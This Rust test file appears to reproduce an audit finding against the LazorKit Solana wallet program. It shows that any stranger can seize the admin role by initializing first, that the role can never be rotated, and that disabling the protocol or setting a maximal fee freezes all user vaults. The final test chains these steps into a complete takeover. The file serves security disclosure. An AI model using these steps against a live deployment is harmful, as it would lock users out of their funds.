//! Reproduction for finding C-1 — the protocol admin is claimed by whoever
//! calls first, can never be rotated, and holds a switch that freezes every
//! user's funds.
//!
//! Three separate defects, exercised one per test:
//!
//!   `c1_a` `initialize_protocol` has no authorization gate at all
//!         (`protocol/initialize_protocol.rs:29-72`)
//!   `c1_b` `update_protocol` cannot write `admin`, so the key never rotates
//!         (`protocol/update_protocol.rs:67-70`)
//!   `c1_c` `enabled = 0` makes `Execute` revert, and `Execute` /
//!         `ExecuteDeferred` are the only ways funds leave a vault
//!         (`entrypoint.rs:135-150`)
//!   `c1_d` the same freeze via an unbounded `execution_fee`
//!
//! `c1_e` is the summary: chain them and a stranger who won the init race
//! locks every wallet permanently.
//!
//! Run with:  cargo test-sbf --features devnet --test repro_c1_admin_freeze

mod common;

use common::*;
use solana_sdk::{pubkey::Pubkey, signature::Keypair, signer::Signer};

/// Custom error codes from `error.rs`.
const ERR_PROTOCOL_ALREADY_INITIALIZED: u32 = 4001;
const ERR_INVALID_PROTOCOL_ADMIN: u32 = 4002;
const ERR_PROTOCOL_DISABLED: u32 = 4003;

// ─────────────────────────────────────────────────────────────────────────
// C-1a — anyone can become the protocol admin
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn c1_a_initialize_protocol_is_permissionless() {
    let mut context = setup_uninitialized();

    // A stranger. Not the deployer, not the upgrade authority, holds no
    // program-derived account, has never interacted with LazorKit.
    let attacker = Keypair::new();
    context
        .svm
        .airdrop(&attacker.pubkey(), 1_000_000_000)
        .expect("airdrop");

    let steal = initialize_protocol_ix(
        context.program_id,
        attacker.pubkey(),
        attacker.pubkey(), // admin  <- attacker names themselves
        attacker.pubkey(), // treasury
        5_000,
        2_000,
        1,
    );

    try_send(&mut context.svm, &attacker, &[steal], &[&attacker])
        .expect("C-1a: initialize_protocol by a stranger should have been rejected, but succeeded");

    assert_eq!(
        config_admin(&context.svm, context.program_id),
        attacker.pubkey(),
        "attacker is now the protocol admin"
    );

    // The real team's initialization transaction now fails permanently.
    let team = context.payer.insecure_clone();
    let legit = initialize_protocol_ix(
        context.program_id,
        team.pubkey(),
        team.pubkey(),
        team.pubkey(),
        5_000,
        2_000,
        1,
    );
    assert_custom_error(
        try_send(&mut context.svm, &team, &[legit], &[&team]),
        ERR_PROTOCOL_ALREADY_INITIALIZED,
        "C-1a: the legitimate deployer is locked out",
    );
}

// ─────────────────────────────────────────────────────────────────────────
// C-1b — the admin key can never be rotated
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn c1_b_admin_cannot_be_rotated() {
    let mut context = setup_test(); // admin == context.payer
    let original_admin = config_admin(&context.svm, context.program_id);
    assert_eq!(original_admin, context.payer.pubkey());

    let successor = Keypair::new();
    context
        .svm
        .airdrop(&successor.pubkey(), 1_000_000_000)
        .expect("airdrop");

    // Exercise every field `UpdateProtocol` accepts. There is no `new_admin`
    // parameter — the instruction simply has no way to express the change.
    let admin = context.payer.insecure_clone();
    let update = update_protocol_ix(
        context.program_id,
        admin.pubkey(),
        1,
        1,
        1,
        successor.pubkey(), // treasury moves; admin cannot
    );
    try_send(&mut context.svm, &admin, &[update], &[&admin]).expect("UpdateProtocol failed");

    assert_eq!(
        config_admin(&context.svm, context.program_id),
        original_admin,
        "C-1b: admin is immutable — a lost or compromised key is terminal"
    );

    // Confirm the successor really has no authority, i.e. this is a genuine
    // dead end rather than a second path we simply did not try.
    let attempt = update_protocol_ix(
        context.program_id,
        successor.pubkey(),
        1,
        1,
        1,
        successor.pubkey(),
    );
    assert_custom_error(
        try_send(&mut context.svm, &successor, &[attempt], &[&successor]),
        ERR_INVALID_PROTOCOL_ADMIN,
        "C-1b: nobody but the original admin can ever update config",
    );
}

// ─────────────────────────────────────────────────────────────────────────
// C-1c — `enabled = 0` freezes every wallet
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn c1_c_disabling_protocol_freezes_all_user_funds() {
    let mut context = setup_test();

    let vault_funding = 100_000_000; // 0.1 SOL
    let wallet = create_ed25519_wallet(&mut context, vault_funding);
    let recipient = Pubkey::new_unique();

    let payer = context.payer.insecure_clone();

    // Baseline: with the protocol enabled, the owner can move their own SOL.
    {
        let ix = solana_sdk::instruction::Instruction {
            program_id: context.program_id,
            accounts: ed25519_execute_accounts(&context, &wallet, recipient),
            data: vault_transfer_execute_data(10_000_000),
        };
        try_send(&mut context.svm, &payer, &[ix], &[&payer, &wallet.owner])
            .expect("baseline Execute should succeed while the protocol is enabled");

        assert_eq!(
            context.svm.get_account(&recipient).map(|a| a.lamports),
            Some(10_000_000),
            "baseline withdrawal landed"
        );
    }

    // The admin flips one byte.
    {
        advance(&mut context.svm);
        let disable = update_protocol_ix(
            context.program_id,
            payer.pubkey(),
            5_000,
            2_000,
            0, // enabled = 0
            payer.pubkey(),
        );
        try_send(&mut context.svm, &payer, &[disable], &[&payer]).expect("UpdateProtocol failed");
    }

    // The same owner, the same wallet, the same funds — now unreachable.
    {
        advance(&mut context.svm);
        let ix = solana_sdk::instruction::Instruction {
            program_id: context.program_id,
            accounts: ed25519_execute_accounts(&context, &wallet, recipient),
            data: vault_transfer_execute_data(10_000_000),
        };
        assert_custom_error(
            try_send(&mut context.svm, &payer, &[ix], &[&payer, &wallet.owner]),
            ERR_PROTOCOL_DISABLED,
            "C-1c: Execute is dead while the protocol is disabled",
        );
    }

    // The vault still holds the money; there is simply no instruction left
    // that can sign for it. Execute (4) and ExecuteDeferred (7) are the only
    // two that CPI with the vault PDA as signer, and `try_collect_fee` gates
    // both. Instructions 1, 2, 3, 5, 6, 8 and 9 never touch vault lamports.
    let vault_balance = context
        .svm
        .get_account(&wallet.vault_pda)
        .expect("vault exists")
        .lamports;
    assert!(
        vault_balance >= 89_000_000,
        "C-1c: {vault_balance} lamports are stranded in the vault with no way out"
    );

    // And it is reversible only by the admin — the user has no recourse.
    {
        advance(&mut context.svm);
        let reenable = update_protocol_ix(
            context.program_id,
            payer.pubkey(),
            5_000,
            2_000,
            1,
            payer.pubkey(),
        );
        try_send(&mut context.svm, &payer, &[reenable], &[&payer]).expect("re-enable failed");

        advance(&mut context.svm);
        let ix = solana_sdk::instruction::Instruction {
            program_id: context.program_id,
            accounts: ed25519_execute_accounts(&context, &wallet, recipient),
            data: vault_transfer_execute_data(10_000_000),
        };
        try_send(&mut context.svm, &payer, &[ix], &[&payer, &wallet.owner])
            .expect("funds are reachable again once the admin allows it");
    }
}

// ─────────────────────────────────────────────────────────────────────────
// C-1d — the same freeze, dressed up as a fee change
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn c1_d_unbounded_execution_fee_is_an_equivalent_freeze() {
    let mut context = setup_test();
    let wallet = create_ed25519_wallet(&mut context, 100_000_000);
    let recipient = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();

    // `update_protocol` applies no ceiling to either fee.
    let gouge = update_protocol_ix(
        context.program_id,
        payer.pubkey(),
        u64::MAX,
        u64::MAX,
        1, // still "enabled" — this looks like a normal config change
        payer.pubkey(),
    );
    try_send(&mut context.svm, &payer, &[gouge], &[&payer]).expect("UpdateProtocol failed");

    let data = read_config(&context.svm, context.program_id);
    let execution_fee = u64::from_le_bytes(
        data[config_offsets::EXECUTION_FEE..config_offsets::EXECUTION_FEE + 8]
            .try_into()
            .unwrap(),
    );
    assert_eq!(
        execution_fee,
        u64::MAX,
        "C-1d: no ceiling is enforced on execution_fee"
    );

    let ix = solana_sdk::instruction::Instruction {
        program_id: context.program_id,
        accounts: ed25519_execute_accounts(&context, &wallet, recipient),
        data: vault_transfer_execute_data(10_000_000),
    };
    let result = try_send(&mut context.svm, &payer, &[ix], &[&payer, &wallet.owner]);
    assert!(
        result.is_err(),
        "C-1d: nobody can pay a u64::MAX fee, so Execute is frozen just as hard \
         as with enabled = 0 — but the config still reads as enabled"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// C-1e — the whole chain
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn c1_e_stranger_wins_init_race_then_freezes_every_wallet() {
    let mut context = setup_uninitialized();

    let attacker = Keypair::new();
    context
        .svm
        .airdrop(&attacker.pubkey(), 1_000_000_000)
        .expect("airdrop");

    // 1. Front-run the deployment's initialize transaction.
    let steal = initialize_protocol_ix(
        context.program_id,
        attacker.pubkey(),
        attacker.pubkey(),
        attacker.pubkey(),
        5_000,
        2_000,
        1,
    );
    try_send(&mut context.svm, &attacker, &[steal], &[&attacker]).expect("init race won");
    try_send(
        &mut context.svm,
        &attacker,
        &[init_shard_ix(
            context.program_id,
            attacker.pubkey(),
            attacker.pubkey(),
            0,
        )],
        &[&attacker],
    )
    .expect("shard init");

    // 2. Real users show up and onboard normally. Nothing looks wrong.
    let wallet = create_ed25519_wallet(&mut context, 500_000_000);
    let recipient = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();

    // Nothing about this instruction changes between the two attempts below —
    // only the protocol config does.
    let withdrawal = solana_sdk::instruction::Instruction {
        program_id: context.program_id,
        accounts: ed25519_execute_accounts(&context, &wallet, recipient),
        data: vault_transfer_execute_data(1_000_000),
    };

    try_send(
        &mut context.svm,
        &payer,
        &[withdrawal.clone()],
        &[&payer, &wallet.owner],
    )
    .expect("users can transact");

    // 3. Whenever they choose, the attacker pulls the switch.
    advance(&mut context.svm);
    let kill = update_protocol_ix(
        context.program_id,
        attacker.pubkey(),
        5_000,
        2_000,
        0,
        attacker.pubkey(),
    );
    try_send(&mut context.svm, &attacker, &[kill], &[&attacker]).expect("kill switch");

    advance(&mut context.svm);
    assert_custom_error(
        try_send(
            &mut context.svm,
            &payer,
            &[withdrawal],
            &[&payer, &wallet.owner],
        ),
        ERR_PROTOCOL_DISABLED,
        "C-1e: every LazorKit wallet is now frozen, permanently, by a stranger",
    );

    // The self-custody claim does not survive this: the user holds the only
    // key to their wallet, and it is worth nothing.
    assert_eq!(
        config_admin(&context.svm, context.program_id),
        attacker.pubkey(),
        "and there is no instruction that takes the admin role back"
    );
}
